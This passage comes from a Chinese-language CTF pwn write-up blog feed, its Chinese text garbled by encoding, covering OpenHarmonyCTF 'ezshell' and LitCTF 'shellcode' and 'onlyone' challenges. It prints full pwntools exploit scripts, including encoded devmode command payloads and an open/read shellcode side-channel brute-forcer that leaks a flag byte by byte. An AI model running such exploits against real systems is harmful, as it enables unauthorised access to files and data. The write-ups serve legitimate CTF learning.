class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403703(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  int v8; // r8d</span><br><span class="line">  int v9; // r9d</span><br><span class="line">  int v10; // edx</span><br><span class="line">  int v11; // ecx</span><br><span class="line">  int v12; // r8d</span><br><span class="line">  int v13; // r9d</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  int v15; // r8d</span><br><span class="line">  int v16; // r9d</span><br><span class="line">  int v17; // ecx</span><br><span class="line">  int v18; // r8d</span><br><span class="line">  int v19; // r9d</span><br><span class="line">  char n46; // [rsp+1Fh] [rbp-21h]</span><br><span class="line">  __int64 v21; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *filename; // [rsp+30h] [rbp-10h]</span><br><span class="line">  __int64 v23; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  result = sub_40A140(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = sub_4040E8(a1);</span><br><span class="line">    if ( !v21 )</span><br><span class="line">      sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v3, v4, v5, v6);</span><br><span class="line">    if ( (unsigned int)sub_40497C(v21) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_405067(v21);</span><br><span class="line">      filename = (char *)sub_4048B7(v21);</span><br><span class="line">      if ( !filename )</span><br><span class="line">        sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v10, v11, v12, v13);</span><br><span class="line">      if ( sub_40A5A0(a1, &quot;flag&quot;) )   #æ£€æµ‹</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4073F6(</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          a1,</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          v14,</span><br><span class="line">          v15,</span><br><span class="line">          v16);</span><br><span class="line">        return sub_405067((__int64)filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = sub_406F83(filename);</span><br><span class="line">        if ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          while ( 1 )  #è¯»å…¥å‘½ä»¤ï¼Œåˆ›å»ºå¿«æ·æ–¹å¼</span><br><span class="line">          &#123;</span><br><span class="line">            n46 = sub_406F44(v23, &quot;rb&quot;);</span><br><span class="line">            if ( n46 == -1 )</span><br><span class="line">              break;</span><br><span class="line">            if ( (unsigned int)(n46 - 32) &lt;= 0x5E || n46 == 10 || n46 == 13 )</span><br><span class="line">              sub_40755B((unsigned int)n46);</span><br><span class="line">            else</span><br><span class="line">              sub_40755B(46LL);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406CBC(v23);</span><br><span class="line">          return sub_405067((__int64)filename);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          sub_4073F6(</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            a1,</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            v17,</span><br><span class="line">            v18,</span><br><span class="line">            v19);</span><br><span class="line">          return sub_405067((__int64)filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      return sub_4073F6(</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               a1,</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               v7,</span><br><span class="line">               v8,</span><br><span class="line">               v9);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ææƒçš„è¯ä¼šå°†å¿«æ·æ–¹å¼æ¸…ç©ºï¼Œåœ¨éšè—å‘½ä»¤ç»“å°¾å¤„</p><p><img src="https://s2.loli.net/2025/06/11/6jemgQYtUrqoRaD.png" alt="image">â€‹</p><p>sub_401211</p><p><img src="https://s2.loli.net/2025/06/11/6jemgQYtUrqoRaD.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 (__fastcall *sub_401211())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *sub_4011E7_1)(); // rax</span><br><span class="line"></span><br><span class="line">  off_410330[0] = sub_40356E;</span><br><span class="line">  read_cmd = (__int64 (__fastcall *)(__int64, int))sub_401169;</span><br><span class="line">  off_410338[0] = sub_401193;</span><br><span class="line">  off_410348[0] = sub_4038BF;</span><br><span class="line">  off_410350[0] = sub_403945;</span><br><span class="line">  off_410358[0] = sub_4011BD;</span><br><span class="line">  sub_4011E7_1 = sub_4011E7;</span><br><span class="line">  psub_4011E7 = sub_4011E7;</span><br><span class="line">  return sub_4011E7_1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_401169(int a1, __int64 a2, __int64 a3, int a4, int a5, int a6)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_4073F6(</span><br><span class="line">           (unsigned int)&quot;cat: %s: Forbidden command\n&quot;,</span><br><span class="line">           a1,</span><br><span class="line">           (unsigned int)&quot;cat: %s: Forbidden command\n&quot;,</span><br><span class="line">           a4,</span><br><span class="line">           a5,</span><br><span class="line">           a6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‹¼æ¥å¥½è·å–flag</p><p>æˆ‘è¿™é‡Œæ²¡æœ‰è¿œç¨‹ç¯å¢ƒï¼Œä¹Ÿæ‡’å¾—é…æœ¬åœ°ç¯å¢ƒäº†ï¼Œå‘ç°flagè¯»å–ä¸å‡ºæ¥ï¼Œä½†å¿«æ·æ–¹å¼ç¡®å®æ˜¯åˆ›å»ºäº†ï¼Œè€Œä¸”ä¹Ÿå»æ‰§è¡Œbcéƒ¨åˆ†äº†</p><p><img src="https://s2.loli.net/2025/06/11/3zNVr6u4Kc85P21.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./ezshell&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./ezshell&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;[pwn@OpenHarmony-PC /]$&quot;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\ad\\51\\57\\51 \\ea\\2f\\70\\77\\6e\\2f\\66&#x27;</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\ad\\51\\57\\51 \\ea\\6c\\61\\67&#x27;</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\bc&#x27;</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;cat $&#123;0&#125;$&#123;1&#125;&#x27;</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>â€</p><p>ç¬¬ä¸‰é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œè¡Œï¼Œjsæ²™ç›’ï¼Œåº•å±‚åªæœ‰printfå‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ„Ÿè§‰æ›´åƒä¸€ä¸ªwebé¢˜,å¯æƒœäº†ï¼Œå½“æ—¶åº”è¯¥æ‰¾ä¸ªwebä½¬ä¸€å—å¸®å¿™çœ‹çš„</p><h3 id="æ€»ç»“">æ€»ç»“</h3><p>é‡åˆ°æ–°å‹é¢˜ç›®ä¸è¦æ…Œå§ï¼Œå¯ä»¥å»çŒœï¼Œå¯ä»¥å»ç›´æ¥ç»ƒè¿œç¨‹å»çœ‹çœ‹ï¼Œä¸€å¼€å§‹æ‹¿åˆ°éƒ½æ˜¯æ‡µé€¼çš„ï¼Œæœ¬åœ°å¯åŠ¨éƒ½ä¼šé‡åˆ°é—®é¢˜ï¼Œå°±ä¼šæœ‰æ”¾å¼ƒçš„æƒ³æ³•ï¼Œæ³¨æ„å®šä½å…³é”®å‡½æ•°ä½ç½®ï¼Œå¯ä»¥ç»“åˆAIå»åˆ†æï¼Œå‘ç°AIè¶Šæ¥è¶Šnbäº†ï¼Œåæ¸…æœªå¤®ï¼Œä»¥åŠpwnoï¼Œæœ¬äººè¡¨ç¤ºç”¨ä¸èµ·</p><p><a href="https://www.52pojie.cn/thread-2032638-1-1.html%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%BF%98%E8%A1%8C%EF%BC%8C%E6%AF%94%E8%BE%83%E8%B4%B9%E6%89%8B%EF%BC%8C%E6%95%B4%E4%BD%93%E9%80%BB%E8%BE%91%E5%8F%AF%E4%BB%A5%E5%88%86%E6%9E%90%E5%87%BA%E6%9D%A5">https://www.52pojie.cn/thread-2032638-1-1.htmlï¼Œè¿™ä¸ªè¿˜è¡Œï¼Œæ¯”è¾ƒè´¹æ‰‹ï¼Œæ•´ä½“é€»è¾‘å¯ä»¥åˆ†æå‡ºæ¥</a></p><p><img src="https://s2.loli.net/2025/06/11/q6WjPpeJUzQ7d9g.png" alt="f9ea75d1f50d76bf51289def817c0e9"></p>]]></content>
    
    
    <summary type="html">0penHarmonyCTF-pwn</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>LitCTF-pwn</title>
    <link href="https://www.thir0th.xyz/posts/464413fc.html"/>
    <id>https://www.thir0th.xyz/posts/464413fc.html</id>
    <published>2025-05-26T09:20:35.000Z</published>
    <updated>2025-05-26T09:24:07.952Z</updated>
    
    <content type="html"><![CDATA[<h1>LitCTF-pwn</h1><p>æ¯”èµ›çš„æ—¶å€™æ¯”è¾ƒå¿™ï¼Œå½“æ—¶æ²¡æ€ä¹ˆçœ‹é¢˜ï¼Œåšäº†ä¸€é“ç­¾åˆ°å°±ä¸‹äº†ï¼Œç»“æŸåæ‰“äº†ä¸€ä¸‹ï¼Œæœ€åä¸€ä¸ªpwnpwnæ²¡çœ‹æ‡‚ä»€ä¹ˆæ„æ€ï¼Œç­‰å¤ç°äº†</p><h4 id="test-your-nc">test_your_nc</h4><p>ç­¾åˆ°é¢˜</p><p><img src="https://s2.loli.net/2025/05/26/uK7bQYvSBrlw4e8.png" alt="d8be4818c4852450eeec8d8d77f5ad7"></p><h4 id="shellcode">shellcode</h4><p>é¢˜ç›®ç›´æ¥æ‰§è¡Œshellcode</p><p><img src="https://s2.loli.net/2025/05/26/Fk3xE1PAWeHvdp5.png" alt="image"></p><p>åªå…è®¸ä½¿ç”¨read+openï¼Œæµ‹ä¿¡é“çˆ†ç ´flag</p><p><img src="https://s2.loli.net/2025/05/26/IBHgKQkzfXb38qR.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line"></span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line"></span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"></span><br><span class="line">def sla(a,b):</span><br><span class="line">    p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">def r(a):</span><br><span class="line">    return p.recv(a, timeout=1)</span><br><span class="line"></span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a, timeout=1)</span><br><span class="line"></span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">def get_addr(size):</span><br><span class="line">    return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def get_addr64():</span><br><span class="line">    return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def get_addr32():</span><br><span class="line">    return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line"></span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line"></span><br><span class="line">def get_hook():</span><br><span class="line">    return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">def log_info(message, status=None):</span><br><span class="line">    color_codes = &#123;</span><br><span class="line">        &#x27;success&#x27;: &#x27;\033[92m&#x27;,</span><br><span class="line">        &#x27;error&#x27;: &#x27;\033[91m&#x27;,</span><br><span class="line">        &#x27;warning&#x27;: &#x27;\033[93m&#x27;,</span><br><span class="line">        None: &#x27;\033[95m&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    color = color_codes.get(status, &#x27;\033[95m&#x27;)</span><br><span class="line">    print(f&quot;&#123;color&#125;[*] &#123;message&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">def get_random_delay():</span><br><span class="line">    return random.uniform(0.1, 0.5)</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;error&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"># å®Œæ•´å­—ç¬¦é›†</span><br><span class="line">full_charset = &quot;&#123;&#125;0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line"></span><br><span class="line"># ç›´æ¥åœ¨æ­¤å¤„è®¾ç½®å·²çŸ¥å‰ç¼€ï¼ˆä¿®æ”¹æ­¤è¡Œå³å¯ï¼‰</span><br><span class="line">FLAG_PREFIX = &quot;flag&#123;&quot;  # &lt;-- åœ¨æ­¤å¤„ä¿®æ”¹å‰ç¼€</span><br><span class="line"></span><br><span class="line">if not FLAG_PREFIX:</span><br><span class="line">    log_info(&quot;æœªè®¾ç½®å‰ç¼€ï¼Œå°†ä½¿ç”¨å®Œæ•´å­—å…¸çˆ†ç ´&quot;, &#x27;warning&#x27;)</span><br><span class="line">    initial_index = 0</span><br><span class="line">else:</span><br><span class="line">    initial_index = len(FLAG_PREFIX)</span><br><span class="line">    log_info(f&quot;å°†ä»ä½ç½® &#123;initial_index&#125; å¼€å§‹çˆ†ç ´ï¼Œå‰ç¼€: &#123;FLAG_PREFIX&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line"></span><br><span class="line">s = full_charset</span><br><span class="line">char_list = [ord(x) for x in s]</span><br><span class="line">flag = FLAG_PREFIX  # åˆå§‹åŒ–flagä¸ºé¢„è®¾å‰ç¼€</span><br><span class="line"></span><br><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">mov rdi, 0x67616c662f2e</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov rsi, 0</span><br><span class="line">mov rdx, 0</span><br><span class="line">mov rax, 2</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 3</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 0x100</span><br><span class="line">mov rax, 0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov bl, byte ptr [rsp+&#123;&#125;]</span><br><span class="line">cmp bl, &#123;&#125;</span><br><span class="line">jz $-0x3 </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">index = initial_index</span><br><span class="line">MAX_RETRY = 5</span><br><span class="line">MAX_CONSECUTIVE_FAILURES = 10</span><br><span class="line">consecutive_failures = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    if consecutive_failures &gt;= MAX_CONSECUTIVE_FAILURES:</span><br><span class="line">        log_info(&quot;æ£€æµ‹åˆ°ä¿¡é“ä¸ç¨³å®šï¼Œæš‚åœ5ç§’åé‡è¯•&quot;, &#x27;warning&#x27;)</span><br><span class="line">        time.sleep(5)</span><br><span class="line">        consecutive_failures = 0</span><br><span class="line">    </span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">        retry_count = MAX_RETRY</span><br><span class="line">        success = False</span><br><span class="line">        </span><br><span class="line">        while retry_count &gt; 0 and not success:</span><br><span class="line">            time.sleep(get_random_delay())</span><br><span class="line">            </span><br><span class="line">            try:</span><br><span class="line">                # åˆ‡æ¢æœ¬åœ°/è¿œç¨‹æ¨¡å¼</span><br><span class="line">                p = process(&#x27;./pwn&#x27;)</span><br><span class="line">                #p = remote(&#x27;node8.anna.nssctf.cn&#x27;, 22581)</span><br><span class="line">                </span><br><span class="line">                payload = asm(shellcode.format(index, char_list[i]))</span><br><span class="line">                sla(b&#x27;Please input your shellcode: \n&#x27;, payload)</span><br><span class="line">                </span><br><span class="line">                try:</span><br><span class="line">                    judge = rl(b&#x27;\n&#x27;)</span><br><span class="line">                except (EOFError, TimeoutError):</span><br><span class="line">                    log_info(f&quot;å­—ç¬¦ &#123;s[i]&#125; å¯¼è‡´è¿æ¥å…³é—­ï¼Œé‡è¯• (&#123;MAX_RETRY-retry_count+1&#125;/&#123;MAX_RETRY&#125;)&quot;, &#x27;warning&#x27;)</span><br><span class="line">                    retry_count -= 1</span><br><span class="line">                    consecutive_failures += 1</span><br><span class="line">                    p.close()</span><br><span class="line">                    continue</span><br><span class="line">                </span><br><span class="line">                if len(judge) &lt; 3:</span><br><span class="line">                    flag += s[i]</span><br><span class="line">                    log_info(f&quot;æ‰¾åˆ°å­—ç¬¦: &#123;s[i]&#125;, å½“å‰flag: &#123;flag&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line">                    index += 1</span><br><span class="line">                    success = True</span><br><span class="line">                    consecutive_failures = 0</span><br><span class="line">                </span><br><span class="line">                p.close()</span><br><span class="line">                </span><br><span class="line">            except Exception as e:</span><br><span class="line">                log_info(f&quot;è¿æ¥å¼‚å¸¸: &#123;str(e)&#125;ï¼Œå‰©ä½™é‡è¯•: &#123;retry_count&#125;&quot;, &#x27;error&#x27;)</span><br><span class="line">                retry_count -= 1</span><br><span class="line">                consecutive_failures += 1</span><br><span class="line">                if p:</span><br><span class="line">                    p.close()</span><br><span class="line">            finally:</span><br><span class="line">                if p:</span><br><span class="line">                    p.close()</span><br><span class="line"></span><br><span class="line">        if success:</span><br><span class="line">            break</span><br><span class="line">                </span><br><span class="line">    if &#x27;&#125;&#x27; in flag:</span><br><span class="line">        log_info(f&quot;æœ€ç»ˆflag: &#123;flag&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">inter()    </span><br></pre></td></tr></table></figure><h4 id="onlyone">onlyone</h4><p>è¯¦ç»†çš„å°±å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://xz.aliyun.com/news/17965">https://xz.aliyun.com/news/17965</a></p><p>è¿™é“é¢˜ä¹Ÿå°±æ˜¯æ¨¡ä»¿çš„å½“æ—¶å¼ºç½‘æ‹Ÿæ€çš„é‚£é“é¢˜ç›®ï¼ŒåŸºæœ¬ä¸Šä¸€æ‘¸ä¸€æ ·ï¼Œåˆ©ç”¨ä¸€æ¬¡fmtæ‰“ä¸€æ¬¡æŒ‡é’ˆè·³æ¿</p><p>åŠ«æŒè¿”å›åœ°å€ä¸ºmainï¼Œ ä»è€Œå®ç°å¤šæ¬¡fmtçš„æœºä¼šï¼Œç„¶åå°†printfçš„è¿”å›åœ°å€+8çš„åœ°æ–¹æ”¹ä¸ºoggï¼Œæœ€åå°†printfçš„è¿”å›åœ°å€æ”¹ä¸ºretï¼Œè§¦å‘oggï¼Œgetshel</p><p><img 